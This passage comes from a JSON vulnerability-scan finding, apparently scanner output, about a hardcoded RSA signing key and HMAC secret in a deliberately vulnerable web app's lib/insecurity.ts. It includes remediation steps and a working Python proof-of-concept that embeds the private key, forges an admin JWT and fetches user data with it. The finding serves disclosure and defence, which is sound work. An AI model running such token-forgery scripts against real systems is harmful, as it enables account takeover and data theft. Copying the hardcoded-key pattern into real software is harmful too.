          ],
          "properties": {
            "security-severity": "9.1",
            "strix": {
              "id": "vuln-0003",
              "severity": "critical",
              "cvss": 9.1,
              "timestamp": "2026-05-09 10:56:54 UTC",
              "target": "http://host.docker.internal:3002",
              "endpoint": "/rest/user/login",
              "method": "POST",
              "cwe": "CWE-798",
              "impact": "An attacker who obtains the hardcoded private key can:\n\n- Forge JWT tokens for any user account, including administrators, achieving full account takeover without credentials\n- Gain unrestricted access to all authenticated endpoints and administrative functionality\n- Persist access indefinitely by generating new tokens at will, regardless of password changes or session invalidation\n- Access sensitive user data (email addresses, password hashes, security answers) through administrative endpoints\n- Modify application state (products, user profiles, orders) through privileged API calls\n\nThe business impact is severe: complete compromise of all user accounts, administrative control of the application, and exposure of all user data stored within the system.",
              "technical_analysis": "The application uses RS256 (RSA with SHA-256) for JWT token signing. The private key is embedded directly as a string literal in the server-side module `lib/insecurity.ts` at line 23. The corresponding public key is stored in `encryptionkeys/jwt.pub` and used for token verification via the `express-jwt` middleware.\n\nThe `authorize` function (line 56) signs tokens using the hardcoded private key:\n```typescript\nexport const authorize = (user = {}) => jwt.sign(user, privateKey, { expiresIn: '6h', algorithm: 'RS256' })\n```\n\nThe `isAuthorized` middleware (line 54) verifies tokens using the public key:\n```typescript\nexport const isAuthorized = () => expressJwt(({ secret: publicKey }) as any)\n```\n\nSince the private key is static and publicly known, any party can produce tokens that pass verification. The token payload contains the user's identity claims (id, email, role), all of which are trusted by the application after signature verification succeeds. There is no additional server-side session binding or token revocation mechanism that would detect forged tokens.\n\nThe HMAC secret for security question answers is also hardcoded on line 44 (`'pa4qacea4VK9t9nGv7yZtwmj'`), enabling offline reversal of security answer hashes.",
              "remediation_steps": "1. Remove hardcoded cryptographic keys from source code immediately. Generate new RSA key pairs using a cryptographically secure random number generator with adequate key length (minimum 2048 bits).\n\n2. Store private keys in a secrets management system (e.g., HashiCorp Vault, AWS Secrets Manager, Azure Key Vault) or in environment variables that are never committed to version control.\n\n3. Implement key rotation procedures. Rotate signing keys periodically and support multiple active verification keys during transition periods.\n\n4. Add the existing keys to a revocation list and force re-authentication for all active sessions after key rotation.\n\n5. Consider implementing additional token binding (e.g., audience claims, issuer validation, fingerprinting) to limit the impact of key compromise.\n\n6. Remove the hardcoded HMAC secret ('pa4qacea4VK9t9nGv7yZtwmj') used for security answer hashing and replace it with a properly managed secret.",
              "poc": {
                "description": "To reproduce:\n\n1. Extract the RSA private key from the application source code at `lib/insecurity.ts` line 23.\n2. Construct a JWT payload with arbitrary user claims, including elevated privileges (e.g., role: \"admin\").\n3. Sign the payload using the extracted private key with the RS256 algorithm.\n4. Submit the forged token in the Authorization header to any authenticated endpoint.\n5. Observe that the application accepts the token and grants access according to the forged claims.\n\nValidation was performed by forging a token for a non-existent user (id: 9999, email: attacker@evil.com, role: admin) and confirming the application accepted it on the `/rest/user/whoami` endpoint, returning the forged identity.",
                "script": "import jwt\nimport time\nimport requests\nimport json\n\nBASE_URL = \"http://host.docker.internal:3002\"\n\n# Hardcoded RSA private key extracted from lib/insecurity.ts line 23\nPRIVATE_KEY = \"\"\"-----BEGIN RSA PRIVATE KEY-----\nMIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8\niMz0EaM4BKUqYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6sy\nCEmUP4qbSd6exou/F+WTISzbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQAB\nAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQcDHvJi7o1IKC/hnIXha0atTX5AUkRRce\n95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/ssxAC+iUVR6KUMh1PE2w\nXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fqFt2LXbLty\ng6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5H\nfUYLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wum\nm2enqqObahDHB5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinr\nutZms87Jyi+D8Br8NY0+Nlf+zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE\n9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWkZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJ\nS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7+UqFPlPVdz1yyr4q24Zx\naw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\n-----END RSA PRIVATE KEY-----\"\"\"\n\n# Forge a token for a fabricated admin user\nforged_payload = {\n    \"status\": \"success\",\n    \"data\": {\n        \"id\": 9999,\n        \"username\": \"forged_attacker\",\n        \"email\": \"attacker@evil.com\",\n        \"password\": \"doesnotmatter\",\n        \"role\": \"admin\",\n        \"deluxeToken\": \"\",\n        \"lastLoginIp\": \"\",\n        \"profileImage\": \"\",\n        \"totp_secret\": \"\",\n        \"isActive\": True,\n        \"createdAt\": \"2026-01-01 00:00:00.000 +00:00\",\n        \"updatedAt\": \"2026-01-01 00:00:00.000 +00:00\",\n        \"deletedAt\": None\n    },\n    \"iat\": int(time.time()),\n    \"exp\": int(time.time()) + 21600\n}\n\n# Sign with the hardcoded private key\nforged_token = jwt.encode(forged_payload, PRIVATE_KEY, algorithm=\"RS256\")\n\n# Use the forged token to access authenticated endpoints\nheaders = {\n    \"Authorization\": f\"Bearer {forged_token}\",\n    \"Cookie\": f\"token={forged_token}\"\n}\n\n# Verify token acceptance\nwhoami = requests.get(f\"{BASE_URL}/rest/user/whoami\", headers=headers)\nprint(f\"Status: {whoami.status_code}\")\nprint(f\"Response: {json.dumps(whoami.json(), indent=2)}\")\n\n# Access admin user data\nuser_data = requests.get(f\"{BASE_URL}/api/Users/1\", headers=headers)\nprint(f\"\\nAdmin user data: {user_data.status_code}\")\nprint(f\"Response: {user_data.text[:300]}\")"
              }
